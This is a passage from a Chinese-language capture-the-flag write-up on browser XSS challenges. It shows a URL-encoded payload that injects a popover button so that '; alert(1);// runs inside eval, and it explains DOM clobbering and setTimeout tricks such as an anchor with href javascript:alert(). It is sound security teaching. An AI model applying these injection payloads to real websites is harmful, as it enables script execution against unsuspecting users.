class=s>&#34;popover&#34;</span> <span class=na>data-container</span><span class=o>=</span><span class=s>&#34;#number&#34;</span> <span class=na>data-content</span><span class=o>=</span><span class=s>&#34;hello&#34;</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>利用题目中原有的<code>$("#keanu").popover("show");</code>来触发我们的 popover ，我们暂且先注释掉题目当中的延迟关闭的功能以便于我们观察。</p><p><figure><a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201165048.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201165048.png loading=lazy></a></figure></p><p>尽管 eval 执行出错，但是我们可以发现 number 标签当中确实被我们注入了一些其他的内容</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>7<span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;popover fade bs-popover-right show&#34;</span> <span class=na>role</span><span class=o>=</span><span class=s>&#34;tooltip&#34;</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;popover238474&#34;</span> <span class=na>x-placement</span><span class=o>=</span><span class=s>&#34;right&#34;</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;position: absolute;&#34;</span><span class=p>&gt;&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;arrow&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>div</span><span class=p>&gt;&lt;</span><span class=nt>h3</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;popover-header&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>h3</span><span class=p>&gt;&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;popover-body&#34;</span><span class=p>&gt;</span>hello<span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>我们这样我们简化一下这个内容:<code>7&lt;template>hello&lt;/template></code>，我们可控的地方就是 7 与 hello ，<code>&lt;template></code>就是 popper.js 实现的 popover 功能的代码，这个我们不需要关注，所以这样问题就变成了如何在<code>$str="$1&lt;template>$any&lt;/template>";eval($str);</code>当中执行代码的问题了。</p><p>到这里其实答案已经呼之欲出了，既然是在<code>eval</code>当中，我们可以利用第一位为单引号，由于中间<code>$any</code>我们任意可控，后面再用一个单引号将<code>&lt;template></code>变成字符串，<code>//</code>注释掉后面的<code>&lt;/template></code>即可，整个 payload 即是<code>'&lt;tamplate>';alert();//&lt;/tamplate></code>。</p><p>所以我们需要这么构造一个元素：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>button</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;keanu&#34;</span> <span class=na>data-toggle</span><span class=o>=</span><span class=s>&#34;popover&#34;</span> <span class=na>data-container</span><span class=o>=</span><span class=s>&#34;#number&#34;</span> <span class=na>data-content</span><span class=o>=</span><span class=s>&#34;&#39;;alert(1);//&#34;</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>即可实现 XSS，所以 payload:</p><pre tabindex=0><code>number=&#39;&amp;name=&lt;button id%3D&#34;keanu&#34; data-toggle%3D&#34;popover&#34; data-container%3D&#34;%23number&#34; data-content%3D&#34;&#39;%3Balert(1)%3B%2F%2F&#34;&gt;
</code></pre><p><figure><a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201170536.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201170536.png loading=lazy></a></figure></p><h2 id=ww3>WW3</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=c>&lt;!-- Challenge --&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>h4</span><span class=p>&gt;</span>Meme Code<span class=p>&lt;/</span><span class=nt>h4</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>textarea</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;form-control&#34;</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;meme-code&#34;</span> <span class=na>rows</span><span class=o>=</span><span class=s>&#34;4&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>textarea</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>div</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;notify&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=cm>/* Utils */</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>escape</span> <span class=o>=</span> <span class=p>(</span><span class=nx>dirty</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=nx>unescape</span><span class=p>(</span><span class=nx>dirty</span><span class=p>).</span><span class=nx>replace</span><span class=p>(</span><span class=sr>/[&lt;&gt;&#39;&#34;=]/g</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>memeTemplate</span> <span class=o>=</span> <span class=p>(</span><span class=nx>img</span><span class=p>,</span> <span class=nx>text</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span><span class=sb>`&lt;style&gt;@import url(&#39;https://fonts.googleapis.com/css?family=Oswald:700&amp;display=swap&#39;);`</span><span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=sb>`.meme-card{margin:0 auto;width:300px}.meme-card&gt;img{width:300px}`</span><span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=sb>`.meme-card&gt;h1{text-align:center;color:#fff;background:black;margin-top:-5px;`</span><span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=sb>`position:relative;font-family:Oswald,sans-serif;font-weight:700}&lt;/style&gt;`</span><span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=sb>`&lt;div class=&#34;meme-card&#34;&gt;&lt;img src=&#34;</span><span class=si>${</span><span class=nx>img</span><span class=si>}</span><span class=sb>&#34;&gt;&lt;h1&gt;</span><span class=si>${</span><span class=nx>text</span><span class=si>}</span><span class=sb>&lt;/h1&gt;&lt;/div&gt;`</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>memeGen</span> <span class=o>=</span> <span class=p>(</span><span class=nx>that</span><span class=p>,</span> <span class=nx>notify</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>text</span> <span class=o>&amp;&amp;</span> <span class=nx>img</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>template</span> <span class=o>=</span> <span class=nx>memeTemplate</span><span class=p>(</span><span class=nx>img</span><span class=p>,</span> <span class=nx>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>notify</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>html</span> <span class=o>=</span> <span class=p>(</span><span class=sb>`&lt;div class=&#34;alert alert-warning&#34; role=&#34;alert&#34;&gt;&lt;b&gt;Meme&lt;/b&gt; created from </span><span class=si>${</span><span class=nx>DOMPurify</span><span class=p>.</span><span class=nx>sanitize</span><span class=p>(</span><span class=nx>text</span><span class=p>)</span><span class=si>}</span><span class=sb>&lt;/div&gt;`</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=nx>setTimeout</span><span class=p>(</span><span class=nx>_</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>$</span><span class=p>(</span><span class=s1>&#39;#status&#39;</span><span class=p>).</span><span class=nx>remove</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                <span class=nx>notify</span> <span class=o>?</span> <span class=p>(</span><span class=nx>$</span><span class=p>(</span><span class=s1>&#39;#notify&#39;</span><span class=p>).</span><span class=nx>html</span><span class=p>(</span><span class=nx>html</span><span class=p>))</span> <span class=o>:</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>                <span class=nx>$</span><span class=p>(</span><span class=s1>&#39;#meme-code&#39;</span><span class=p>).</span><span class=nx>text</span><span class=p>(</span><span class=nx>template</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=p>},</span> <span class=mi>1000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=cm>/* Main */</span>
</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>notify</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>text</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>URL</span><span class=p>(</span><span class=nx>location</span><span class=p>).</span><span class=nx>searchParams</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;text&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>img</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>URL</span><span class=p>(</span><span class=nx>location</span><span class=p>).</span><span class=nx>searchParams</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;img&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>text</span> <span class=o>&amp;&amp;</span> <span class=nx>img</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>document</span><span class=p>.</span><span class=nx>write</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=sb>`&lt;div class=&#34;alert alert-primary&#34; role=&#34;alert&#34; id=&#34;status&#34;&gt;`</span><span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=sb>`&lt;img class=&#34;circle&#34; src=&#34;</span><span class=si>${</span><span class=nx>escape</span><span class=p>(</span><span class=nx>img</span><span class=p>)</span><span class=si>}</span><span class=sb>&#34; onload=&#34;memeGen(this, notify)&#34;&gt;`</span><span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=sb>`Creating meme... (</span><span class=si>${</span><span class=nx>DOMPurify</span><span class=p>.</span><span class=nx>sanitize</span><span class=p>(</span><span class=nx>text</span><span class=p>)</span><span class=si>}</span><span class=sb>)&lt;/div&gt;`</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>$</span><span class=p>(</span><span class=s1>&#39;#meme-code&#39;</span><span class=p>).</span><span class=nx>text</span><span class=p>(</span><span class=nx>memeTemplate</span><span class=p>(</span><span class=s1>&#39;https://i.imgur.com/PdbDexI.jpg&#39;</span><span class=p>,</span> <span class=s1>&#39;When you get that WW3 draft letter&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>这个题目让我深深地体会到了 JavaScript 的恶意&mldr;先放个图，大家自行先体会一下，然后我们开始分析一下题目。</p><p><figure><a href=https://i.redd.it/rz3o1yibnc511.png><img src=https://i.redd.it/rz3o1yibnc511.png loading=lazy></a></figure></p><p>题目用比较多的代码做了一个获取图片以及输出自定义 text 的功能，仍旧是上题的四个外部 JS 文件，以及一大段 JS 代码。本题涉及到 JavaScript 比较多的黑魔法，我们一个个来看看。</p><p>审计代码，我们可以先看到题目定义了几个函数</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>escape</span> <span class=o>=</span> <span class=nx>dirty</span> <span class=p>=&gt;</span> <span class=nx>unescape</span><span class=p>(</span><span class=nx>dirty</span><span class=p>).</span><span class=nx>replace</span><span class=p>(</span><span class=sr>/[&lt;&gt;&#39;&#34;=]/g</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>);</span>
</span></span></code></pre></div><p>用来过滤我们的 img 参数</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>memeTemplate</span> <span class=o>=</span> <span class=p>(</span><span class=nx>img</span><span class=p>,</span> <span class=nx>text</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=sb>`&lt;style&gt;@import url(&#39;https://fonts.googleapis.com/css?family=Oswald:700&amp;display=swap&#39;);`</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=sb>`.meme-card{margin:0 auto;width:300px}.meme-card&gt;img{width:300px}`</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=sb>`.meme-card&gt;h1{text-align:center;color:#fff;background:black;margin-top:-5px;`</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=sb>`position:relative;font-family:Oswald,sans-serif;font-weight:700}&lt;/style&gt;`</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=sb>`&lt;div class=&#34;meme-card&#34;&gt;&lt;img src=&#34;</span><span class=si>${</span><span class=nx>img</span><span class=si>}</span><span class=sb>&#34;&gt;&lt;h1&gt;</span><span class=si>${</span><span class=nx>text</span><span class=si>}</span><span class=sb>&lt;/h1&gt;&lt;/div&gt;`</span>
</span></span><span class=line><span class=cl>  <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></div><p>用来将我们传入的 img & text 参数构造一个 HTML 模版</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>memeGen</span> <span class=o>=</span> <span class=p>(</span><span class=nx>that</span><span class=p>,</span> <span class=nx>notify</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>text</span> <span class=o>&amp;&amp;</span> <span class=nx>img</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>template</span> <span class=o>=</span> <span class=nx>memeTemplate</span><span class=p>(</span><span class=nx>img</span><span class=p>,</span> <span class=nx>text</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>notify</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nx>html</span> <span class=o>=</span> <span class=sb>`&lt;div class=&#34;alert alert-warning&#34; role=&#34;alert&#34;&gt;&lt;b&gt;Meme&lt;/b&gt; created from </span><span class=si>${</span><span class=nx>DOMPurify</span><span class=p>.</span><span class=nx>sanitize</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=nx>text</span>
</span></span><span class=line><span class=cl>      <span class=p>)</span><span class=si>}</span><span class=sb>&lt;/div&gt;`</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>setTimeout</span><span class=p>(</span><span class=nx>_</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nx>$</span><span class=p>(</span><span class=s2>&#34;#status&#34;</span><span class=p>).</span><span class=nx>remove</span><span class=p>();</span>
</span></span><span class=line><span class=cl>      <span class=nx>notify</span> <span class=o>?</span> <span class=nx>$</span><span class=p>(</span><span class=s2>&#34;#notify&#34;</span><span class=p>).</span><span class=nx>html</span><span class=p>(</span><span class=nx>html</span><span class=p>)</span> <span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=nx>$</span><span class=p>(</span><span class=s2>&#34;#meme-code&#34;</span><span class=p>).</span><span class=nx>text</span><span class=p>(</span><span class=nx>template</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>},</span> <span class=mi>1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></div><p>用来进行 DOM 元素操作等，看起来我们的目标就是<code>setTimeout</code>函数中通过<code>$("#notify").html(html)</code>来执行代码了，所以我们可能需要想办法把 notify 参数设置为 true。</p><h3 id=dom-clobbering>DOM Clobbering</h3><p>首先我们先来看看几个比较有趣的例子：</p><p><figure><a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201223309.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201223309.png loading=lazy></a></figure></p><p>根据 MDN 文档</p><blockquote><p>​ The <strong><code>domain</code></strong> property of the <a class=link href=https://developer.mozilla.org/en-US/docs/Web/API/Document target=_blank rel=noopener><code>Document</code></a> interface gets/sets the domain portion of the origin of the current document, as used by the <a class=link href=https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy target=_blank rel=noopener>same origin policy</a>.</p></blockquote><p>这里的<code>document.domain</code>并没有获取到我的域名<code>zedd.vv</code>，反而是获取到了 img 标签，然后我们可以直接输出 document 对象来看看是怎么回事</p><p><figure><a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201224629.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201224629.png loading=lazy></a></figure></p><p>通过这个例子我们可以知道，可以通过一些标签的 id(name) 属性来控制 document(window) 通过 DOM API(BOM API) 获取到的某个东西</p><p><figure><a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201224817.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201224817.png loading=lazy></a></figure></p><p>我查阅过相关资料，也询问过一些前端的专业人员，这里给我的解释是"document 和 window 两个变量，其实是 DOM 和 BOM 的规范，一般来说这两个不应该被当做普通的 JS 对象，但是规范与实现不同"，&ldquo;都是因为上古遗留问题，现在哪有直接写 document.xxx 来获取元素的，TS 和 eslint 都会报错&rdquo;。</p><p>这种操作具体可以参考 <a class=link href=http://www.thespanner.co.uk/2013/05/16/dom-clobbering/ target=_blank rel=noopener>dom-clobbering</a>，不算是新的攻击手法，但是有效，我们可以通过利用这种 Trick 来实现一些操作。</p><h3 id=settimeout>setTimeout</h3><p>我们了解了 Dom Clobbering 之后，我们可以先看看可以怎么通过<code>setTimeout</code>来利用</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;a&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nx>a</span><span class=p>.</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>URL</span><span class=p>(</span><span class=nx>location</span><span class=p>).</span><span class=nx>searchParams</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;b&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>setTimeout</span><span class=p>(</span><span class=nx>ok</span><span class=p>,</span> <span class=mi>2000</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>简化了一下题目代码，对于以上的代码，我们可以通过利用 Dom Clobbering 来实现 XSS ，因为我们可以直接传入 id 为 ok 的标签进行 XSS ，例如传入</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>id</span><span class=o>=</span><span class=s>ok</span> <span class=na>href</span><span class=o>=</span><span class=s>javascript:alert()</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>可是为什么呢？</p><p>根据 MDN 文档，<code>setTimeout</code>的第一个参数，必须是个函数或字符串。可是根据 Dom Clobbering ，这里的<code>ok</code>应该是一个 a 标签，既然这不是个函数，它就尝试用<code>toString</code>方法转换成字符串，而根据 MDN 文档 <a class=link href=https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement target=_blank rel=noopener>HTMLAnchorElement</a></p><blockquote><p>​ <a class=link href=https://developer.mozilla.org/en-US/docs/Web/API/HTMLHyperlinkElementUtils/toString target=_blank rel=noopener><code>HTMLHyperlinkElementUtils.toString()</code></a></p><p>Returns a <a class=link href=https://developer.mozilla.org/en-US/docs/Web/API/USVString target=_blank rel=noopener><code>USVString</code></a> containing the whole URL. It is a synonym for <a class=link href=https://developer.mozilla.org/en-US/docs/Web/API/HTMLHyperlinkElementUtils/href target=_blank rel=noopener><code>HTMLHyperlinkElementUtils.href</code></a>, though it can&rsquo;t be used to modify the value.</p></blockquote><p>而当 a 标签通过<code>toString()</code>方法转换我们可以得到它的 href 属性，也就是<code>javascript:alert()</code>，所以我们就可以执行代码了。</p><h3 id=notify>notify</h3><p>好了，回到我们的 notify 上，虽然我们可以通过 DOM Clobbering 进行“污染”一些参数，但是题目直接规定了<code>let notify = false</code>，浏览器当然也不可能允许我们修改服务端的代码，这可怎么办？</p><p>其实这里的 notify 比较具有误导性，比较像 C 语言入门的时候函数传参部分，我们把整个代码改一下：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>			<span class=kr>const</span> <span class=nx>memeGen</span> <span class=o>=</span> <span class=p>(</span><span class=nx>that</span><span class=p>,</span> <span class=nx>notify</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=k>if</span> <span class=p>(</span><span class=nx>text</span> <span class=o>&amp;&amp;</span> <span class=nx>img</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>					<span class=nx>template</span> <span class=o>=</span> <span class=nx>memeTemplate</span><span class=p>(</span><span class=nx>img</span><span class=p>,</span> <span class=nx>text</span><span class=p>);</span>
</span></span><span class=line><span class=cl>					<span class=k>if</span> <span class=p>(</span><span class=nx>notify</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>						<span class=c1>//...
</span></span></span><span class=line><span class=cl><span class=c1></span>					<span class=p>}</span>
</span></span><span class=line><span class=cl>				<span class=p>}</span>
</span></span><span class=line><span class=cl>			<span class=p>};</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=cm>/* Main */</span>
</span></span><span class=line><span class=cl>  <span class=kd>let</span> <span class=nx>notify</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kd>let</span> <span class=nx>text</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>URL</span><span class=p>(</span><span class=nx>location</span><span class=p>).</span><span class=nx>searchParams</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;text&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kd>let</span> <span class=nx>img</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>URL</span><span class=p>(</span><span class=nx>location</span><span class=p>).</span><span class=nx>searchParams</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;img&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>text</span> <span class=o>&amp;&amp;</span> <span class=nx>img</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>document</span><span class=p>.</span><span class=nx>write</span><span class=p>(</span>
</span></span><span class=line><span class=cl>      <span class=sb>`&lt;div class=&#34;alert alert-primary&#34; role=&#34;alert&#34; id=&#34;status&#34;&gt;`</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>      <span class=sb>`&lt;img class=&#34;circle&#34; src=&#34;</span><span class=si>${</span><span class=nx>escape</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=nx>img</span>
</span></span><span class=line><span class=cl>      <span class=p>)</span><span class=si>}</span><span class=sb>&#34; onload=&#34;memeGen(this, notify)&#34;&gt;`</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>      <span class=sb>`Creating meme... (</span><span class=si>${</span><span class=nx>DOMPurify</span><span class=p>.</span><span class=nx>sanitize</span><span class=p>(</span><span class=nx>text</span><span class=p>)</span><span class=si>}</span><span class=sb>)&lt;/div&gt;`</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>$</span><span class=p>(</span><span class=s2>&#34;#meme-code&#34;</span><span class=p>).</span><span class=nx>text</span><span class=p>(</span>
</span></span><span class=line><span class=cl>      <span class=nx>memeTemplate</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;https://i.imgur.com/PdbDexI.jpg&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;When you get that WW3 draft letter&#34;</span>
</span></span><span class=line><span class=cl>      <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>再简化一下就成了我们的 C 语言函数传参的练习题了</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>memeGen</span> <span class=o>=</span> <span class=p>(</span><span class=nx>that</span><span class=p>,</span> <span class=nx>x</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>x</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>//...
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></div><p>为了易于理解我们可以写成这样就不易弄混了，所以，对于<code>memeGen</code>来说，<code>notify</code>只是一个参数变量名，区别于我们一开始提到的 Javascript Scope 部分，该函数内的<code>notify</code>参数变量取决于该函数所在的作用域。</p><p>而对于<code>memeGen</code>函数来说，它的作用域并非是在<code>let notify = false</code>所处的 JS 代码域当中，而是在通过<code>document.write</code>函数之后的作用域，所以这里就涉及到了作用域的问题。</p><h3 id=javascript-scope>JavaScript Scope</h3><p>所以对于执行<code>document.write</code>函数过后，也就是对于<code>onload=memeGen</code>函数来说，其作用域并非是 JS 的作用域，在题目中本来这么几个作用域：window、script、onload，其中 window 包含了后两个，后两个互不包含，所以这里在 onload 找不到 notify 变量，就会去 window 的作用域找，就会把 script 作用域当中的 notify 给找到，notify 变量也就成 false 了。</p><p>我们也可以通过一个简单的例子来理解：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>name</span><span class=o>=</span><span class=s>x</span><span class=p>&gt;&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>test</span> <span class=o>=</span> <span class=p>(</span><span class=nx>that</span><span class=p>,</span><span class=nx>x</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;Test&#39;x: &#34;</span> <span class=o>+</span> <span class=nx>x</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>x</span><span class=p>){</span>
</span></span><span class=line><span class=cl>      <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;JS Magic&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
